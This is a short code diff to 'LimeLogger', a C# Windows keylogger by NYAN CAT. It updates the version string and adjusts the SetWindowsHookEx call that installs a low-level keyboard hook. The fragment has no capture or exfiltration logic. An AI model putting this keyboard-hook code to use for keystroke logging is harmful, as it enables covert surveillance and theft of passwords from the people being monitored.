@@ -7,9 +7,8 @@ using System.Windows.Forms;
 
 
 //       │ Author     : NYAN CAT
-//       │ Name       : LimeLogger v0.2.6
+//       │ Name       : LimeLogger v0.2.6.1
 //       │ Contact    : https://github.com/NYAN-x-CAT
-
 //       This program is distributed for educational purposes only.
 
 
@@ -25,7 +24,6 @@ namespace LimeLogger
             _hookID = SetHook(_proc);
             Application.Run();
             //UnhookWindowsHookEx(_hookID);
-            //CurrentActiveWindowTitle = "";
             //Application.Exit();
         }
 
@@ -33,8 +31,7 @@ namespace LimeLogger
         {
             using (Process curProcess = Process.GetCurrentProcess())
             {
-                return SetWindowsHookEx(WHKEYBOARDLL, proc,
-                GetModuleHandle(curProcess.ProcessName + ".exe"), 0);
+                return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(curProcess.ProcessName), 0);
             }
         }
 
